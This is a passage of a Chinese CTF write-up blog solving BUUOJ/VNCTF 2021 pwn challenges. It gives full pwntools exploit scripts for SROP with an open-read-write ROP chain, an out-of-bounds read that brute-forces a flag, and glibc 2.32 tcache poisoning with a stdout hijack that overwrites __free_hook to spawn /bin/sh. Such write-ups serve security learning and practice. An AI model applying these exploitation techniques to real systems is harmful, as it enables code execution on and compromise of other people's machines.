<p><img src="https://i.loli.net/2021/03/28/KGHNtIBhfWqkVLl.png" alt="image.png"></p>
<p>给出了 libc 基址，白给一个 <code>rt_sigreturn</code>的系统调用，直接 栈迁移 + orw 一套带走</p>
<p><img src="https://i.loli.net/2021/03/28/KzhsFjwtaA4fiQn.png" alt="image.png"></p>
<p>构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29143</span>)<span class="comment">#process(&#x27;./vn_pwn_babybabypwn_1&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)<span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Here is my gift: &#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rsi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rsi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx ; pop rbx ; ret&#x27;</span>)).__next__()</span><br><span class="line">flag_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rip = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">frame.rsp = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="built_in">bytes</span>(frame)[<span class="number">8</span>:])</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可获得flag</p>
<p><img src="https://i.loli.net/2021/03/28/bamD1vJYnFMWskN.png" alt="image.png"></p>
<h1 id="VNCTF2021-Pwn"><a href="#VNCTF2021-Pwn" class="headerlink" title="VNCTF2021 - Pwn"></a>VNCTF2021 - Pwn</h1><p>太棒了，我逐渐理解一切.jpg</p>
<h2 id="VNCTF-2021-White-Give-Flag-read-out-of-bounds"><a href="#VNCTF-2021-White-Give-Flag-read-out-of-bounds" class="headerlink" title="[VNCTF 2021]White_Give_Flag - read out of bounds"></a>[VNCTF 2021]White_Give_Flag - read out of bounds</h2><p>惯例的 <code>checksec</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/04/01/nwjrFpHgQ1zJcEa.png" alt="image.png"></p>
<p>分析主函数逻辑可以发现仅提供了分配、释放、编辑堆块的功能，以及一个无用的打印随机数的功能，并不存在明显漏洞</p>
<p><img src="https://i.loli.net/2021/04/02/arpekP6iS8wHIC4.png" alt="image.png"></p>
<p>在开头的初始化过程中会随机malloc数次并读入flag内容，其中最后一次并没有清空堆块，flag内容存在于 <code>[0x300, 0x500]</code> 大小的某个堆块中</p>
<p><img src="https://i.loli.net/2021/04/01/1jfGBdwcme4Jzh3.png" alt="image.png"></p>
<p>在主函数中读入选项时有个 bug ：返回值并非读入的数据通过atoi转成的数值，而是read() 的返回值，即读入的长度</p>
<p><img src="https://i.loli.net/2021/04/01/ArZkfW4yzwxiDaH.png" alt="image.png"></p>
<p>而读入选项后会打印 <code>qword_202120</code>数组中的字符串，我们不难想到的是：若是我们直接发送 <code>EOF</code> ，则 read() 会返回 <code>0</code>，我们即可向前越界读，这里可以使用 pwntools 库中的 <code>shutdown_raw()</code> 函数完成</p>
<p><img src="https://i.loli.net/2021/04/01/vXoUfw2rhDKl75k.png" alt="image.png"></p>
<p>前面刚好是储存堆块的数组，刚好可以读到第四个堆块</p>
<p><img src="https://i.loli.net/2021/04/01/rRU4MJPxQe9nW5p.png" alt="image.png"></p>
<p>那么我们只需要不断尝试分配到一个存在 flag 的堆块后打印即可</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(command * <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">hit</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        new(<span class="number">0x10</span>)</span><br><span class="line">    new(<span class="number">0x300</span> + hit * <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">&#x27;arttnba3arttnba4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.shutdown_raw(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">    s = p.recv()</span><br><span class="line">    log.info(s)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">b&#x27;&#125;&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;try time: &#x27;</span> + <span class="built_in">str</span>(count))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;try: &#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27; now&#x27;</span>)</span><br><span class="line">            p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">39123</span>)<span class="comment">#process(&#x27;./whitegive&#x27;)</span></span><br><span class="line">            exp(i)</span><br><span class="line">            p.close()</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            i %= <span class="number">0x20</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log.failure(<span class="string">&#x27;exception!&#x27;</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            i %= <span class="number">0x20</span></span><br><span class="line">            count += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>运行即可获得flag</p>
<p>（都要给非酋爆傻了）</p>
<p><img src="https://i.loli.net/2021/04/02/LiKChB2Vgmo5wvt.png" alt="image.png"></p>
<h2 id="VNCTF-2021-ff-tcache-poisoning-IO-FILE-hijack"><a href="#VNCTF-2021-ff-tcache-poisoning-IO-FILE-hijack" class="headerlink" title="[VNCTF 2021]ff - tcache poisoning + IO_FILE hijack"></a>[VNCTF 2021]ff - tcache poisoning + IO_FILE hijack</h2><p>惯例的 <code>checksec</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/03/28/GnvgcRy2Sdz8MY4.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>大致是有着分配、释放、打印、编辑堆块功能的程序，但是限制了只能编辑两次、打印一次，同时<strong>一次只能操作一个堆块</strong></p>
<p><img src="https://i.loli.net/2021/03/28/vz5wyYXgJxA6pIu.png" alt="image.png"></p>
<p>释放功能中没有清空，存在 UAF</p>
<p><img src="https://i.loli.net/2021/03/28/JXQhGvoTieV14xa.png" alt="image.png"></p>
<p>但是libc 的版本为 <code>2.32</code> ，那么我们需要用掉唯一的一次打印的机会泄露堆基址才能通过 double free 进行任意地址写</p>
<p>而我们还需要想办法泄露 libc 基址，但是我们只能分配 <code>0x80</code> 的堆块，即使劫持了 tcache struct 后所释放的堆块也只能够进入fastbin中（而且我们一次只能操作一个堆块</p>
<p><img src="https://i.loli.net/2021/03/28/qKEHz4FSWkXJ8lM.png" alt="image.png"></p>
<p>考虑到 tcache struct 本身便是一个 <code>0x291</code>的堆块，我们可以劫持之后改对应计数为7后free掉，送入 unsorted bin 中，之后切割这个大chunk，利用残留指针 大概1&#x2F;16 的几率可以爆破到 stdout 附近，劫持 stdout 以泄露 libc 基址，最后改 <code>__free_hook</code> 为 system 函数后释放一个内容为 <code>/bin/sh </code>的 chunk 即可 get shell</p>
<blockquote>
<p>非酋的话可能要爆破很久…</p>
</blockquote>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">hit_byte</span>):</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line"></span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_leak * <span class="number">0x1000</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    edit(<span class="string">b&#x27;arttnba3arttnba4&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    edit(p64(heap_leak ^ (heap_base + <span class="number">0x10</span>)))</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;\x00\x00&#x27;</span> * (<span class="number">0xe</span> + <span class="number">0x10</span> + <span class="number">9</span>) + <span class="string">b&#x27;\x07\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x40</span>, (<span class="string">b&#x27;\x00\x00&#x27;</span> * <span class="number">3</span> + <span class="string">b&#x27;\x01\x00&#x27;</span> + <span class="string">b&#x27;\x00\x00&#x27;</span> * <span class="number">2</span> + <span class="string">b&#x27;\x01\x00&#x27;</span>).ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># unknown reason, bigger than 0x48 will failed.</span></span><br><span class="line">    new(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>) + <span class="string">b&#x27;\xc0&#x27;</span> + p8(hit_byte * <span class="number">0x10</span> + <span class="number">6</span>)) <span class="comment"># 1/16 to hit stdout</span></span><br><span class="line">    new(<span class="number">0x40</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e4744</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x70</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;the no.&#x27;</span> + <span class="built_in">str</span>(count) + <span class="string">&#x27; try&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">b&#x27;try: &#x27;</span> + <span class="string">b&#x27;\xc0&#x27;</span> + p8(i * <span class="number">0x10</span> + <span class="number">6</span>))</span><br><span class="line">            p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26018</span>)<span class="comment">#process(&#x27;./ff&#x27;) #</span></span><br><span class="line">            exp(i)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            p.close()</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            count = count + <span class="number">1</span></span><br><span class="line">            i = i % <span class="number">16</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/03/28/jiQUwRnTrZfuEty.png" alt="image.png"></p>
<blockquote>
<h3 id="glibc2-32下tcache新增的保护"><a href="#glibc2-32下tcache新增的保护" class="headerlink" title="glibc2.32下tcache新增的保护"></a>glibc2.32下tcache新增的保护</h3><p>一开始题目给出的libc版本为2.32，笔者原以为和libc2.31应当没有太大区别，故最初想的解法便是 1&#x2F;16 的几率爆破到tcache struct，exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">hit = [<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;\x10&#x27;</span>, <span class="string">b&#x27;\x20&#x27;</span>, <span class="string">b&#x27;\x30&#x27;</span>, <span class="string">b&#x27;\x40&#x27;</span>, <span class="string">b&#x27;\x50&#x27;</span>, <span class="string">b&#x27;\x60&#x27;</span>, <span class="string">b&#x27;\x70&#x27;</span>, <span class="string">b&#x27;\x80&#x27;</span>, <span class="string">b&#x27;\x90&#x27;</span>, <span class="string">b&#x27;\xa0&#x27;</span>, <span class="string">b&#x27;\xb0&#x27;</span>, <span class="string">b&#x27;\xc0&#x27;</span>, <span class="string">b&#x27;\xd0&#x27;</span>, <span class="string">b&#x27;\xe0&#x27;</span>, <span class="string">b&#x27;\xf0&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">hit_byte</span>):</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    edit(<span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">    free()</span><br><span class="line">    </span><br><span class="line">    edit(<span class="string">b&#x27;\x10&#x27;</span> + hit_byte)</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;\x00\x00&#x27;</span> * (<span class="number">0xe</span> + <span class="number">0x10</span> + <span class="number">9</span>) + <span class="string">b&#x27;\x07\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;[+] libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">0x40</span>, (<span class="string">b&#x27;\x01\x00&#x27;</span> * <span class="number">2</span>).ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    new(<span class="number">0x40</span>, (<span class="string">b&#x27;\x01\x00&#x27;</span> * <span class="number">2</span>).ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;the no.&#x27;</span> + <span class="built_in">str</span>(count) + <span class="string">&#x27;try&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">b&#x27;try: &#x27;</span> + hit[i])</span><br><span class="line">            p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26454</span>)<span class="comment">#process(&#x27;./ff&#x27;)#</span></span><br><span class="line">            exp(hit[i])</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            count = count + <span class="number">1</span></span><br><span class="line">            i = i % <span class="number">16</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1&#x2F;16 的几率，本地很快就通了，但是打远程一直爆破不出来，出现了两种报错信息：</p>
<ul>
<li><p><code>malloc(): unaligned tcache chunk detected</code></p>
</li>
<li><p><code>free(): invalid pointer</code></p>
</li>
</ul>
